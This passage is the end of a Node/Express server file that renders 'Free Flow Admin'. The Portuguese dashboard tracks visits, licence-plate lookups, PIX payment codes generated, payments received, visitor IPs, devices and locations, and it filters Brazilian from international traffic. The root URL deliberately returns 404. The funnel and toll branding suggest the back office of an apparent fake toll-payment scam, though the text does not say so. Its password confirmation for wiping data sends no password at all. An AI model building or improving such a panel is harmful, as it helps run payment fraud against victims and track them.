.btn-cancel:hover{background:var(--border2);color:var(--t1)}
.btn-danger{background:var(--red);color:#fff}
.btn-danger:hover{background:#dc2626}
.modal-err{color:var(--red);font-size:12px;text-align:center;margin-top:12px;display:none}

/* Empty state */
.empty-state{text-align:center;padding:60px 20px;color:var(--t4)}
.empty-state svg{margin-bottom:12px;opacity:.4}

/* Responsive */
@media(max-width:768px){
  .header{padding:12px 16px;gap:10px}
  .header-title{font-size:13px}
  .stats-grid{grid-template-columns:repeat(2,1fr);gap:8px;padding:12px 16px}
  .stat-card{padding:14px}
  .stat-value{font-size:22px}
  .stat-icon{width:28px;height:28px;border-radius:6px}
  .stat-icon svg{width:14px;height:14px}
  .toolbar{padding:10px 16px;gap:8px}
  .table-wrap{padding:0 16px 16px}
  .pager{padding:0 16px 16px}
  .hdr-btn span{display:none}
}
@media(max-width:480px){
  .stats-grid{grid-template-columns:repeat(2,1fr);gap:6px;padding:10px 12px}
  .stat-card{padding:12px}
  .stat-value{font-size:20px}
  .stat-label{font-size:10px}
  .header{padding:10px 12px}
  .toolbar{padding:8px 12px}
  .table-wrap{padding:0 12px 12px}
  .pager{padding:0 12px 12px}
  .hdr-btn{padding:6px 10px;font-size:11px}
}
</style></head><body>

<!-- Header -->
<div class="header">
  <div class="header-brand">
    <div class="header-dot"></div>
    <span class="header-title">Free Flow Admin</span>
  </div>
  <div class="header-actions">
    <a href="/painel/export" class="hdr-btn">
      <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" y1="15" x2="12" y2="3"/></svg>
      <span>Exportar</span>
    </a>
    <button id="btnClear" class="hdr-btn danger">
      <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M3 6h18"/><path d="M19 6v14c0 1-1 2-2 2H7c-1 0-2-1-2-2V6"/><path d="M8 6V4c0-1 1-2 2-2h4c1 0 2 1 2 2v2"/></svg>
      <span>Limpar</span>
    </button>
    <a href="/painel/logout" class="hdr-btn">
      <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M9 21H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h4"/><polyline points="16 17 21 12 16 7"/><line x1="21" y1="12" x2="9" y2="12"/></svg>
      <span>Sair</span>
    </a>
  </div>
</div>

<!-- Stats -->
<div class="stats-grid">
  <div class="stat-card">
    <div class="stat-header">
      <span class="stat-label">Receita</span>
      <div class="stat-icon green"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="12" y1="2" x2="12" y2="22"/><path d="M17 5H9.5a3.5 3.5 0 0 0 0 7h5a3.5 3.5 0 0 1 0 7H6"/></svg></div>
    </div>
    <div class="stat-value" style="color:var(--green)">R$&nbsp;${receita.toFixed(2).replace('.',',')}</div>
  </div>
  <div class="stat-card">
    <div class="stat-header">
      <span class="stat-label">Pagamentos</span>
      <div class="stat-icon green"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><path d="m9 12 2 2 4-4"/></svg></div>
    </div>
    <div class="stat-value">${pagamentos}<span class="stat-sub">${pct(pagamentos,visitas)}%</span></div>
  </div>
  <div class="stat-card">
    <div class="stat-header">
      <span class="stat-label">PIX Gerados</span>
      <div class="stat-icon amber"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect width="20" height="14" x="2" y="5" rx="2"/><line x1="2" y1="10" x2="22" y2="10"/></svg></div>
    </div>
    <div class="stat-value">${pixGerados}<span class="stat-sub">${pct(pixGerados,visitas)}%</span></div>
  </div>
  <div class="stat-card">
    <div class="stat-header">
      <span class="stat-label">Consultas</span>
      <div class="stat-icon blue"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="11" cy="11" r="8"/><path d="m21 21-4.3-4.3"/></svg></div>
    </div>
    <div class="stat-value">${consultou}<span class="stat-sub">${pct(consultou,visitas)}%</span></div>
  </div>
  <div class="stat-card">
    <div class="stat-header">
      <span class="stat-label">Visitas BR</span>
      <div class="stat-icon purple"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M2 12s3-7 10-7 10 7 10 7-3 7-10 7-10-7-10-7Z"/><circle cx="12" cy="12" r="3"/></svg></div>
    </div>
    <div class="stat-value">${brEvents}<span class="stat-sub">de ${total}</span></div>
  </div>
  <div class="stat-card">
    <div class="stat-header">
      <span class="stat-label">IPs Únicos</span>
      <div class="stat-icon purple"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><path d="M12 2a15.3 15.3 0 0 1 4 10 15.3 15.3 0 0 1-4 10 15.3 15.3 0 0 1-4-10 15.3 15.3 0 0 1 4-10z"/><line x1="2" y1="12" x2="22" y2="12"/></svg></div>
    </div>
    <div class="stat-value">${uniqueIPs}</div>
  </div>
</div>

<!-- Toolbar -->
<div class="toolbar">
  <select id="filtroStatus" class="tool-select">
    <option value="">Todos os status</option>
    <option value="visita">Visita</option>
    <option value="consultou">Consultou</option>
    <option value="pix_gerado">PIX Gerado</option>
    <option value="pago">Pago</option>
  </select>
  <button id="btnInt" class="tool-btn">
    <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><path d="M12 2a15.3 15.3 0 0 1 4 10 15.3 15.3 0 0 1-4 10 15.3 15.3 0 0 1-4-10 15.3 15.3 0 0 1 4-10z"/><line x1="2" y1="12" x2="22" y2="12"/></svg>
    Internacionais (${intEvents})
  </button>
  <div class="tool-spacer"></div>
</div>

<!-- Table -->
<div class="table-wrap">
<table>
<thead><tr>
  <th>Data</th><th>Status</th><th>Placa</th><th>Valor</th>
  <th>Consultou</th><th>PIX Gerado</th><th>Pago em</th>
  <th>Dispositivo</th><th>Local</th><th>IP</th>
</tr></thead>
<tbody id="tBody">${rows || '<tr><td colspan="10" class="empty-state"><svg width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5"><circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="12"/><line x1="12" y1="16" x2="12.01" y2="16"/></svg><br>Nenhum evento registrado</td></tr>'}</tbody>
</table>
</div>
${totalPages > 1 ? '<div class="pager">' + pagerLinks.join('') + '</div>' : ''}

<script>
// Clear modal
document.getElementById('btnClear').addEventListener('click', function(){
  var ov = document.createElement('div');
  ov.className='modal-overlay';
  ov.innerHTML='<div class="modal-card">'
    +'<div class="modal-title">Limpar todos os dados</div>'
    +'<p class="modal-desc">Esta ação é irreversível. Todos os registros serão apagados permanentemente do sistema.</p>'
    +'<input type="password" id="clearPw" class="modal-input" placeholder="Confirme com a senha" autocomplete="off">'
    +'<div class="modal-btns">'
    +'<button class="btn-cancel" id="modalCancel">Cancelar</button>'
    +'<button class="btn-danger" id="modalConfirm">Apagar tudo</button>'
    +'</div>'
    +'<p class="modal-err" id="modalErr">Senha incorreta.</p>'
    +'</div>';
  document.body.appendChild(ov);
  document.getElementById('clearPw').focus();
  document.getElementById('modalCancel').onclick=function(){document.body.removeChild(ov);};
  ov.addEventListener('click',function(e){if(e.target===ov)document.body.removeChild(ov);});
  document.getElementById('modalConfirm').onclick=function(){
    fetch('/painel/clear',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({})})
      .then(function(r){return r.json();})
      .then(function(d){
        if(d.ok){document.body.removeChild(ov);window.location.reload();}
        else{document.getElementById('modalErr').style.display='block';}
      })
      .catch(function(){document.getElementById('modalErr').style.display='block';});
  };
});

// Filters
(function(){
  var filtroStatus=document.getElementById('filtroStatus');
  var btnInt=document.getElementById('btnInt');
  var showInt=false;

  function apply(){
    var st=filtroStatus.value;
    document.querySelectorAll('#tBody tr[data-status]').forEach(function(tr){
      var matchS=!st||tr.dataset.status===st;
      var matchP=showInt||tr.dataset.pais==='br';
      tr.style.display=(matchS&&matchP)?'':'none';
    });
  }
  apply();
  filtroStatus.addEventListener('change',apply);
  btnInt.addEventListener('click',function(){
    showInt=!showInt;
    btnInt.classList.toggle('active',showInt);
    apply();
  });
})();
</script>
</body></html>`);
});
// ---------- HEALTH (hidden) ----------
app.get('/', (req, res) => res.status(404).send('Not found'));

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log('API running on port ' + PORT + ' — storage: ' + (GITHUB_REPO ? 'GitHub (' + GITHUB_REPO + ')' : '/tmp only')));
